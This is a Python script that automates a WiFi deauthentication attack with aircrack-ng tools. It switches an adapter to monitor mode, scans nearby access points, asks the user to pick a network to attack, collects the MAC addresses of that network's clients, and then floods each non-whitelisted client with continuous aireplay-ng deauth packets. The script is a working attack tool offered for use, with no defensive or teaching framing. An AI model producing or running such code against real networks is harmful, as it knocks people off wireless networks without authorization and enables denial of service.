import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime
import shlex
def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status
active_wireless_networks = []
mac_whitelist1= "4c:0f:c7:5d:8b:b4".upper()
mac_whitelist2="test".upper()
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()
for file_name in os.listdir():
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
hacknic = "wlan0"
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nReady to make choice.")
while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")
try:
    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
    cmd = f'gnome-terminal -e "airodump-ng -w clients --write-interval 1 --output-format csv --bssid {hackbssid} --channel {hackchannel} {hacknic}mon"'
    discover_clients = subprocess.Popen(shlex.split(cmd),stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    seconds = 6
    subprocess.call("clear", shell=True)
    while seconds != 0 :
        print("Please wait",seconds,"...")
        time.sleep(1)
        seconds = seconds - 1
        subprocess.call("clear", shell=True)
    for file_name in os.listdir():
        if "clients" in file_name:
            clients_file = open(file_name,"r")
            clients_file.seek(0)
            pattern = "[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}"
            clients = re.findall(pattern, clients_file.read())
            for target in clients:
                if target == hackbssid or target==mac_whitelist1 or target==mac_whitelist2:
                    continue
                else:
                    cmd = f"gnome-terminal -e 'aireplay-ng --deauth  0 -a {hackbssid} -c {target}  {hacknic}mon'"
                    command = subprocess.Popen(shlex.split(cmd))
    subprocess.Popen.kill(discover_clients)
    discover_clients.terminate()
except KeyboardInterrupt():
    subprocess.call(f"airmon-ng stop {hacknic}mon",shell=True)
